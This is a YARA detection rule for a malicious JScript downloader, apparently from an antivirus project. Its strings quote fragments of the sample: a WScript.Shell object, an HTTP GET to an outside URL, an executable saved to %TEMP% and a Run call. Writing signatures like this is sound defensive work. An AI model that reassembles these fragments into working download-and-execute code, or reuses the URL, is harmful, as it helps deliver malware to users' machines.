rule sig_20160328_c2be8797f1fd061cb197275edc042e03 {
  meta:
    description = "datamaliciousorder - file 20160328_c2be8797f1fd061cb197275edc042e03.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2bc8f27240330e1004922ba3704d263120ba5b615026bc5012ad928b00047452"

  strings:
    $s1  = "function Jukshnx() {return Raxdo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HE3OlFoAXTxd3Fi.exe\";};" fullword ascii
    $s2  = "Sqvtrcxv[Xoitjtl](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Bsopss](Pswzhvcbgx() * 11)} while (Sqvtrcxv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Raxdo = function Wekzrbbk() {return WScript[Hedeten](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fwvxtkhi(Qxxcwcr, Mqycq){return Qxxcwcr - Mqycq;};" fullword ascii
    $s6  = "function Vmfwg() {return ((Sfbji == true) && (Sfbji == Npcykfz)) ? 1 : Jaxampkl;};" fullword ascii
    $s7  = "function Smalesaztp(Njblygpq){Raxdo[\"Run\"](Njblygpq, Jaxampkl, Jaxampkl);};" fullword ascii
    $s8  = "function Zllvzwlpxo(){return Lybjxapsuk;};" fullword ascii
    $s9  = "var Urrneizh = false;" fullword ascii
    $s10 = "var Iggvt = new this[\"Date\"]();" fullword ascii
    $s11 = "function Plufftnrn(Tniebpktg) {var Wnlyxfjxl = (1, 2, 3, 4, 5, Tniebpktg); return Wnlyxfjxl;};" fullword ascii
    $s12 = "return Fwvxtkhi(Cvmobygc, Mqatsfuo);" fullword ascii
    $s13 = "Sfbji = true; " fullword ascii
    $s14 = "function Pswzhvcbgx(){return 22;};" fullword ascii
    $s15 = " while (Zebgicq){" fullword ascii
    $s16 = "Npcykfz = true; " fullword ascii
    $s17 = "function Fmrnxksetv()" fullword ascii
    $s18 = "var Npcykfz = false;" fullword ascii
    $s19 = "var Sfbji = false;" fullword ascii
    $s20 = "} catch(Sjjdyc){Zebgicq = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}